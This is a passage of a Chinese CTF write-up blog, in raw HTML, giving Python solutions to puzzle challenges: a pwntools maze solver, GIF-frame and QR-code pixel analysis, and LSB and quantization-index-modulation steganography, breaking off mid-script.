class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Play again? (y/n): &#x27;</span> <span class="keyword">in</span> ss:</span><br><span class="line">        p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">        i = <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="funny-maze"><a href="#funny-maze" class="headerlink" title="funny_maze"></a>funny_maze</h3><blockquote><p>七月被困在了迷宫里，十秒后迷宫的终点就要永远消失了，你能帮她走出迷宫吗？ nc 连接</p></blockquote><p>老迷宫人了（疯狂超时~</p><hr><p>参考文章： <a href="https://blog.csdn.net/weixin_53622248/article/details/111826362"><strong>2020纵横杯迷宫题wp</strong></a> 、 <a href="https://blog.csdn.net/jark_/article/details/77532105"><strong>DFS</strong></a> </p><hr><p>附上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">s,x,y</span>):</span></span><br><span class="line">    <span class="keyword">if</span> mapx[x][y]==<span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span> s</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(s)+<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> mapx[x][y]==<span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment">#wasd</span></span><br><span class="line">    <span class="keyword">if</span> vis[x][y]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    vis[x][y]=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> y==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> dfs(s + <span class="string">&#x27;w&#x27;</span>, x - <span class="number">1</span>, y):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="comment"># if dfs(s + &#x27;a&#x27;, x, y - 1):</span></span><br><span class="line">        <span class="comment">#     return True</span></span><br><span class="line">        <span class="keyword">if</span> dfs(s + <span class="string">&#x27;s&#x27;</span>, x + <span class="number">1</span>, y):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> dfs(s + <span class="string">&#x27;d&#x27;</span>, x, y + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> dfs(s+<span class="string">&#x27;w&#x27;</span>,x-<span class="number">1</span>,y):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> dfs(s+<span class="string">&#x27;a&#x27;</span>,x,y-<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> dfs(s+<span class="string">&#x27;s&#x27;</span>,x+<span class="number">1</span>,y):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> dfs(s+<span class="string">&#x27;d&#x27;</span>,x,y+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29722</span>)</span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;###########\n&quot;</span>)</span><br><span class="line">mapx=[<span class="string">&quot;###########\n&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    mapx.append(p.recvline())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx[i])):</span><br><span class="line">        <span class="keyword">if</span> mapx[i][j]== <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            xx=i</span><br><span class="line">            yy=j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">vis=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    vis.append([])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">        vis[i].append(<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># print vis</span></span><br><span class="line">dfs(<span class="string">&#x27;&#x27;</span>,xx,yy)</span><br><span class="line"><span class="comment"># p.recv(1024)</span></span><br><span class="line"><span class="comment">#1st finished</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;#####################\n&quot;</span>)</span><br><span class="line">mapx=[<span class="string">&quot;#####################\n&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    mapx.append(p.recvline())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx[i])):</span><br><span class="line">        <span class="keyword">if</span> mapx[i][j]== <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            xx=i</span><br><span class="line">            yy=j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">vis=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    vis.append([])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        vis[i].append(<span class="literal">False</span>)</span><br><span class="line">dfs(<span class="string">&#x27;&#x27;</span>,xx,yy)</span><br><span class="line"><span class="comment"># p.recv(9999)</span></span><br><span class="line"><span class="comment"># p.sendafter(&quot;So, Let&#x27;s move on to the next level!\n&quot;,&#x27;1&#x27;)</span></span><br><span class="line"><span class="comment"># print len(a)</span></span><br><span class="line"><span class="comment"># #2nd finished</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;###############################\n&quot;</span>)</span><br><span class="line">mapx=[<span class="string">&quot;###############################\n&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    mapx.append(p.recvline())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx[i])):</span><br><span class="line">        <span class="keyword">if</span> mapx[i][j]== <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            xx=i</span><br><span class="line">            yy=j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">vis=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    vis.append([])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">62</span>):</span><br><span class="line">        vis[i].append(<span class="literal">False</span>)</span><br><span class="line">dfs(<span class="string">&#x27;&#x27;</span>,xx,yy)</span><br><span class="line">p.recv(<span class="number">9999</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;#####################################################################################################\n&quot;</span>)</span><br><span class="line">mapx=[<span class="string">&quot;#####################################################################################################\n&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    mapx.append(p.recvline())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mapx[i])):</span><br><span class="line">        <span class="keyword">if</span> mapx[i][j]== <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            xx=i</span><br><span class="line">            yy=j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">vis=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    vis.append([])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        vis[i].append(<span class="literal">False</span>)</span><br><span class="line">dfs(<span class="string">&#x27;&#x27;</span>,xx,yy)</span><br><span class="line">p.recv(<span class="number">100000</span>)</span><br><span class="line">p.recv(<span class="number">100000</span>)</span><br></pre></td></tr></table></figure><h3 id="Just-a-GIF"><a href="#Just-a-GIF" class="headerlink" title="Just a GIF"></a>Just a GIF</h3><blockquote><p>你能从GIF中找到小豆泥隐藏的flag吗？</p></blockquote><p>首先分离gif，然后每11帧为一组，共分成41组，不难发现每组和第一组的对比中有部分像素rgb值只差1，于是我们把像素一样的变为白色，不一样的为黑色，进而得到11张图，其中最后的两张是告诉我们前九张图对应的位置，然后我们把前九张拼起来得到datamartix码，扫码即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202108021274567.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202108021256414212.png"></p><p>附上一些脚本</p><ol><li>分离GIF（PS：也可利用工具<strong>gifsplitter</strong>分离）</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageSequence</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseGIF</span>(<span class="params">gifname</span>):</span></span><br><span class="line">    <span class="comment"># 将gif解析为图片</span></span><br><span class="line">    <span class="comment"># 读取GIF</span></span><br><span class="line">    im = Image.<span class="built_in">open</span>(gifname)</span><br><span class="line">    <span class="comment"># GIF图片流的迭代器</span></span><br><span class="line">    <span class="built_in">iter</span> = ImageSequence.Iterator(im)</span><br><span class="line">    <span class="comment"># 获取文件名</span></span><br><span class="line">    file_name = gifname.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 判断目录是否存在</span></span><br><span class="line">    pic_dirct = <span class="string">&quot;./gif/&quot;</span>.<span class="built_in">format</span>(file_name)</span><br><span class="line">    mkdirlambda = <span class="keyword">lambda</span> x: os.makedirs(</span><br><span class="line">        x) <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(x) <span class="keyword">else</span> <span class="literal">True</span>  <span class="comment"># 目录是否存在,不存在则创建</span></span><br><span class="line">    mkdirlambda(pic_dirct)</span><br><span class="line">    <span class="comment"># 遍历图片流的每一帧</span></span><br><span class="line">    <span class="keyword">for</span> IMG <span class="keyword">in</span> <span class="built_in">iter</span>:</span><br><span class="line">        print(<span class="string">&quot;image %d: mode %s, size %s&quot;</span> % (index, IMG.mode, IMG.size))</span><br><span class="line">        IMG.save(<span class="string">&quot;./gif/IMG&quot;</span> + <span class="built_in">str</span>(index).zfill(<span class="number">5</span>) + <span class="string">&quot;.bmp&quot;</span>)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">parseGIF(<span class="string">&#x27;Just_a_GIF.gif&#x27;</span>)</span><br></pre></td></tr></table></figure><p>2.1. 提取11张图片，然后手工拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    img1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;gif/IMG000&#123;&#125;.bmp&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(b).zfill(<span class="number">2</span>)))</span><br><span class="line">    x, y = img1.size</span><br><span class="line">    img = Image.new(<span class="string">&#x27;P&#x27;</span>, (y, y), <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        tmpimg = Image.<span class="built_in">open</span>(<span class="string">&#x27;gif/IMG00&#123;&#125;.bmp&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(b+<span class="number">11</span>* (a+<span class="number">1</span>)).zfill(<span class="number">3</span>)))</span><br><span class="line">        print(<span class="string">&#x27;gif/IMG00&#123;&#125;.bmp&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(b+<span class="number">11</span>* (a+<span class="number">1</span>)).zfill(<span class="number">3</span>)))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">                p1 = img1.getpixel((j, i))</span><br><span class="line">                p2 = tmpimg.getpixel((j, i))</span><br><span class="line">                <span class="keyword">if</span> p1 != p2:</span><br><span class="line">                    img.putpixel((j, i), <span class="number">0</span>)</span><br><span class="line">    img.save(<span class="string">&#x27;gifout/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(b + <span class="number">1</span>)))</span><br><span class="line">    plt.imshow(img)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure><p>2.2. 一步到位.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment"># 7 1 6</span></span><br><span class="line"><span class="comment"># 9 3 4</span></span><br><span class="line"><span class="comment"># 5 2 8</span></span><br><span class="line">pasteArray = [<span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">4</span>]</span><br><span class="line">resultImage = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">83</span> * <span class="number">3</span>, <span class="number">83</span> * <span class="number">3</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> group <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    imageModel = Image.<span class="built_in">open</span>(<span class="string">&quot;./gif/IMG&#123;:05d&#125;.bmp&quot;</span>.<span class="built_in">format</span>(group))</span><br><span class="line">    image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">83</span>,<span class="number">83</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    width, height = imageModel.size</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(group + <span class="number">11</span>, <span class="number">451</span>, <span class="number">11</span>):</span><br><span class="line">        imageSlice = Image.<span class="built_in">open</span>(<span class="string">&quot;./gif/IMG&#123;:05d&#125;.bmp&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">                <span class="keyword">if</span> imageModel.getpixel((y,x)) != imageSlice.getpixel((y,x)):</span><br><span class="line">                    print(y,x)</span><br><span class="line">                    print(imageModel.getpixel((y,x)), imageSlice.getpixel((y,x)))</span><br><span class="line">                    image.putpixel((y,x), (<span class="number">16</span>,<span class="number">63</span>,<span class="number">145</span>))</span><br><span class="line">    resultImage.paste(image, (((pasteArray[group] - <span class="number">1</span>) % <span class="number">3</span>) * <span class="number">83</span>, ((pasteArray[group] - <span class="number">1</span>) // <span class="number">3</span>) * <span class="number">83</span>, ((pasteArray[group] - <span class="number">1</span>) % <span class="number">3</span>) * <span class="number">83</span> + <span class="number">83</span>,((pasteArray[group] - <span class="number">1</span>) // <span class="number">3</span>) * <span class="number">83</span> + <span class="number">83</span>))</span><br><span class="line">    resultImage.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="Nuclear-wastewater"><a href="#Nuclear-wastewater" class="headerlink" title="Nuclear wastewater"></a>Nuclear wastewater</h3><blockquote><p>小明去日本旅游时，发现了一张被核废水污染过的二维码，你能从中发现什么信息吗。</p></blockquote><p>⾸先读取下⼆维码的颜⾊，发现⼆维码的颜⾊除了⽩⾊的外都是单⼀的r或g或b有值 ，猜测可能是ascii码，但是有不可⻅字符，将范围选定在32到128之间，统计r或g或b的值在这些像素间的数量，可以看到有规律，按照降序将这些值转为字符排下来得到key即为压缩包密码：<code>#R@/&amp;p~!</code> </p><p>附上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;Nuclear wastewater.png&#x27;</span>)</span><br><span class="line">x,y = img.size</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">        p = img.getpixel((j,i))</span><br><span class="line">        <span class="keyword">if</span> p!=(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>):</span><br><span class="line">            res.append(p)</span><br><span class="line">print(res)</span><br><span class="line">l = res</span><br><span class="line">ll = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        <span class="keyword">if</span> j!=<span class="number">0</span>:</span><br><span class="line">            ll.append(j)</span><br><span class="line">print(ll)</span><br><span class="line">rr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ll:</span><br><span class="line">    <span class="keyword">if</span> <span class="number">32</span>&lt;i&lt;<span class="number">128</span>:</span><br><span class="line">        rr += <span class="built_in">chr</span>(i)</span><br><span class="line">print(rr)</span><br><span class="line">rrr = Counter(rr)</span><br><span class="line">rrr = <span class="built_in">sorted</span>(rrr.items(), key = <span class="keyword">lambda</span> kv:(kv[<span class="number">1</span>], kv[<span class="number">0</span>]),reverse=<span class="literal">True</span>)</span><br><span class="line">print(rrr)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rrr:</span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">1</span>]!=<span class="number">100</span>:</span><br><span class="line">        print(i[<span class="number">0</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到的<code>flag.txt</code>文本不难看出可能存在零宽，进而得知应该是关于<strong>Citrix</strong>相关的解密方式</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210802121157746.png"></p><p>厨子上搜一下就有了，最后通过两次解密得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021080212554162.png"></p><h3 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h3><blockquote><p>有手就行的隐写</p></blockquote><p>放入steg中我们可以看到信息 <code>There are somethings in G plane</code> ，于是我们G通道lsb得到图片获得一半的flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021080212500832.png"></p><p>在GitHub上找到量化索引调制相关脚本 <a href="https://github.com/pl561/QuantizationIndexModulation"><strong>QuantizationIndexModulation</strong></a>，对其稍作修改跑一下得到另一半flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202108021266398.png"></p><p>附上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QIM</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, delta</span>):</span></span><br><span class="line">        self.delta = delta</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">embed</span>(<span class="params">self, x, m</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        x is a vector of values to be quantized individually</span></span><br><span class="line"><span class="string">        m is a binary vector of bits to be embeded</span></span><br><span class="line"><span class="string">        returns: a quantized vector y</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        x = x.astype(<span class="built_in">float</span>)</span><br><span class="line">        d = self.delta</span><br><span class="line">        y = np.<span class="built_in">round</span>(x/d) * d + (-<span class="number">1</span>)**(m+<span class="number">1</span>) * d/<span class="number">4.</span></span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detect</span>(<span class="params">self, z</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        z is the received vector, potentially modified</span></span><br><span class="line"><span class="string">        returns: a detected vector z_detected and a detected message m_detected</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        shape = z.shape</span><br><span class="line">        z = z.flatten()</span><br><span class="line"></span><br><span class="line">        m_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line">        z_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line"></span><br><span class="line">        z0 = self.embed(z, <span class="number">0</span>)</span><br><span class="line">        z1 = self.embed(z, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        d0 = np.<span class="built_in">abs</span>(z - z0)</span><br><span class="line">        d1 = np.<span class="built_in">abs</span>(z - z1)</span><br><span class="line"></span><br><span class="line">        gen = <span class="built_in">zip</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(z_detected)), d0, d1)</span><br><span class="line">        <span class="keyword">for</span> i, dd0, dd1 <span class="keyword">in</span> gen:</span><br><span class="line">            <span class="keyword">if</span> dd0 &lt; dd1:</span><br><span class="line">                m_detected[i] = 